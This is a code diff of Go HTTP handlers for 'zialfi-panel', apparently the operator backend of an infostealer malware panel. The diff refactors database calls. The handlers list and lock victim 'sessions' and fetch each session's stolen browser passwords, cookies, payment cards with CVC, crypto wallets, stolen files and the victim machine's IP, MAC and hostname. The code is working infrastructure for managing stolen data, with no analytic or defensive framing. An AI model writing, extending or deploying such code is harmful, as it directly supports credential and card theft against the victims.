@@ -10,9 +10,9 @@ import (
 
 	"github.com/go-chi/chi/v5"
 	"zialfi-panel/internal/db"
+	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/services"
 	"zialfi-panel/internal/ws"
-	"zialfi-panel/internal/middleware"
 )
 
 var allowedSorts = map[string]string{
@@ -35,12 +35,11 @@ var walletIcons = map[string]string{
 
 type SessionsHandler struct {
 	db          *sql.DB
-	provider    db.ProviderType
 	broadcaster services.Broadcaster
 }
 
-func NewSessionsHandler(db *sql.DB, broadcaster services.Broadcaster, provider db.ProviderType) *SessionsHandler {
-	return &SessionsHandler{db: db, provider: provider, broadcaster: broadcaster}
+func NewSessionsHandler(db *sql.DB, broadcaster services.Broadcaster) *SessionsHandler {
+	return &SessionsHandler{db: db, broadcaster: broadcaster}
 }
 
 // broadcastSessionUpdate notifies live viewers that a session changed.
@@ -162,7 +161,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 
 	countQuery := "SELECT COUNT(*) FROM sessions s " + where
 	var total int
-	if err := db.QueryRow(h.db, h.provider, countQuery, args...).Scan(&total); err != nil {
+	if err := db.QueryRow(h.db, countQuery, args...).Scan(&total); err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to count sessions")
 		return
 	}
@@ -203,7 +202,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 	queryArgs[len(args)] = limit
 	queryArgs[len(args)+1] = offset
 
-	rows, err := db.Query(h.db, h.provider, query, queryArgs...)
+	rows, err := db.Query(h.db, query, queryArgs...)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to query sessions")
 		return
@@ -226,7 +225,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 			// ponytail: N+1 query per row — batch this into a single hash map
 			// query when HWID-based grouping becomes a measurable bottleneck.
 			var dupCount int
-			db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions WHERE hwid = ? AND id != ?", item.Hwid, item.ID).Scan(&dupCount)
+			db.QueryRow(h.db, "SELECT COUNT(*) FROM sessions WHERE hwid = ? AND id != ?", item.Hwid, item.ID).Scan(&dupCount)
 			item.DuplicateCount = dupCount
 		}
 		items = append(items, item)
@@ -240,10 +239,10 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 
 	writeJSON(w, http.StatusOK, map[string]any{
 		"sessions": items,
-		"total": total,
-		"page":  page,
-		"limit": limit,
-		"pages": pages,
+		"total":    total,
+		"page":     page,
+		"limit":    limit,
+		"pages":    pages,
 	})
 }
 
@@ -262,7 +261,7 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 		Viewed      int
 		OwnerID     string
 	}
-	err := db.QueryRow(h.db, h.provider, `
+	err := db.QueryRow(h.db, `
 		SELECT id, build_id, hwid, os, username, ip, country_code, created_at, COALESCE(viewed, 0), COALESCE(owner_id, '')
 		FROM sessions WHERE id = ?`, id).Scan(
 		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
@@ -305,7 +304,7 @@ func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
 	// Check session lock — hide sensitive data if locked by another
 	claims := middleware.ClaimsFromContext(r.Context())
 	var lockedBy string
-	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 	if locked && claims != nil && lockedBy != claims.UserID && claims.Role != "admin" {
 		passwords = []db.Password{}
 		cookies = []db.Cookie{}
@@ -342,7 +341,7 @@ func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	result, err := db.Exec(h.db, h.provider, "DELETE FROM sessions WHERE id = ?", id)
+	result, err := db.Exec(h.db, "DELETE FROM sessions WHERE id = ?", id)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to delete session")
 		return
@@ -371,7 +370,7 @@ func (h *SessionsHandler) MarkViewed(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	result, err := db.Exec(h.db, h.provider, "UPDATE sessions SET viewed = 1 WHERE id = ?", id)
+	result, err := db.Exec(h.db, "UPDATE sessions SET viewed = 1 WHERE id = ?", id)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to mark as viewed")
 		return
@@ -387,7 +386,7 @@ func (h *SessionsHandler) MarkViewed(w http.ResponseWriter, r *http.Request) {
 }
 
 func queryPasswords(d *sql.DB, sessionID string) []db.Password {
-	rows, err := d.Query(
+	rows, err := db.Query(d,
 		"SELECT id, session_id, url, username, password_value, browser FROM passwords WHERE session_id = ?",
 		sessionID)
 	if err != nil {
@@ -406,7 +405,7 @@ func queryPasswords(d *sql.DB, sessionID string) []db.Password {
 }
 
 func queryCookies(d *sql.DB, sessionID string) []db.Cookie {
-	rows, err := d.Query(
+	rows, err := db.Query(d,
 		"SELECT id, session_id, domain, name, value, path FROM cookies WHERE session_id = ?",
 		sessionID)
 	if err != nil {
@@ -425,7 +424,7 @@ func queryCookies(d *sql.DB, sessionID string) []db.Cookie {
 }
 
 func queryCards(d *sql.DB, sessionID string) []db.Card {
-	rows, err := d.Query(
+	rows, err := db.Query(d,
 		"SELECT id, session_id, number, exp_month, exp_year, holder, cvc FROM cards WHERE session_id = ?",
 		sessionID)
 	if err != nil {
@@ -444,7 +443,7 @@ func queryCards(d *sql.DB, sessionID string) []db.Card {
 }
 
 func queryWalletsWithIcons(d *sql.DB, sessionID string) []db.WalletResponse {
-	rows, err := d.Query(
+	rows, err := db.Query(d,
 		"SELECT id, session_id, name, path FROM wallets WHERE session_id = ?",
 		sessionID)
 	if err != nil {
@@ -471,7 +470,7 @@ func queryWalletsWithIcons(d *sql.DB, sessionID string) []db.WalletResponse {
 }
 
 func queryFiles(d *sql.DB, sessionID string) []db.StolenFile {
-	rows, err := d.Query(
+	rows, err := db.Query(d,
 		"SELECT id, session_id, filename, size FROM stolen_files WHERE session_id = ?",
 		sessionID)
 	if err != nil {
@@ -491,7 +490,7 @@ func queryFiles(d *sql.DB, sessionID string) []db.StolenFile {
 
 func querySystemInfo(d *sql.DB, sessionID string) *db.SystemInfo {
 	var info db.SystemInfo
-	err := d.QueryRow(`
+	err := db.QueryRow(d, `
 		SELECT session_id, cpu, gpu, ram, os, screen, hostname, local_ip,
 		       mac, public_ip, hwid, uptime
 		FROM system_info WHERE session_id = ?`, sessionID).Scan(
@@ -521,7 +520,7 @@ func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var exists int
-	err := db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions WHERE id = ?", sessionID).Scan(&exists)
+	err := db.QueryRow(h.db, "SELECT COUNT(*) FROM sessions WHERE id = ?", sessionID).Scan(&exists)
 	if err != nil || exists == 0 {
 		writeError(w, http.StatusNotFound, "session not found")
 		return
@@ -533,10 +532,10 @@ func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Auto-unlock stale locks (>30 min)
-	db.Exec(h.db, h.provider, "DELETE FROM session_locks WHERE session_id = ? AND locked_at < datetime('now', '-30 minutes')", sessionID)
+	db.Exec(h.db, "DELETE FROM session_locks WHERE session_id = ? AND locked_at < CURRENT_TIMESTAMP - INTERVAL '30 minutes'", sessionID)
 
 	var currentLockedBy string
-	err = db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&currentLockedBy)
+	err = db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&currentLockedBy)
 	if err == nil {
 		if currentLockedBy != claims.UserID {
 			writeError(w, http.StatusConflict, "session is locked by another user")
@@ -547,10 +546,8 @@ func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
 	}
 
 	now := time.Now().UTC().Format("2006-01-02 15:04:05")
-	_, err = db.Exec(h.db, h.provider, 
-		"INSERT INTO session_locks (session_id, locked_by, locked_at) VALUES (?, ?, ?)",
-		sessionID, claims.UserID, now,
-	)
+	_, err = db.Exec(h.db, "INSERT INTO session_locks (session_id, locked_by, locked_at) VALUES (?, ?, ?)",
+		sessionID, claims.UserID, now)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to lock session")
 		return
@@ -574,9 +571,7 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var lockedBy string
-	err := db.QueryRow(h.db, h.provider, 
-		"SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID,
-	).Scan(&lockedBy)
+	err := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy)
 	if err == sql.ErrNoRows {
 		writeError(w, http.StatusNotFound, "session is not locked")
 		return
@@ -596,7 +591,7 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	_, err = db.Exec(h.db, h.provider, "DELETE FROM session_locks WHERE session_id = ?", sessionID)
+	_, err = db.Exec(h.db, "DELETE FROM session_locks WHERE session_id = ?", sessionID)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to unlock session")
 		return
@@ -609,7 +604,7 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *SessionsHandler) ownsSession(r *http.Request, sessionID string) bool {
-	return sessionOwnedBy(h.db, h.provider, r, sessionID)
+	return sessionOwnedBy(h.db, r, sessionID)
 }
 
 func (h *SessionsHandler) DeleteEmpty(w http.ResponseWriter, r *http.Request) {
@@ -619,7 +614,7 @@ func (h *SessionsHandler) DeleteEmpty(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	result, err := db.Exec(h.db, h.provider, "DELETE FROM sessions WHERE quality_score = 0")
+	result, err := db.Exec(h.db, "DELETE FROM sessions WHERE quality_score = 0")
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to delete empty sessions")
 		return
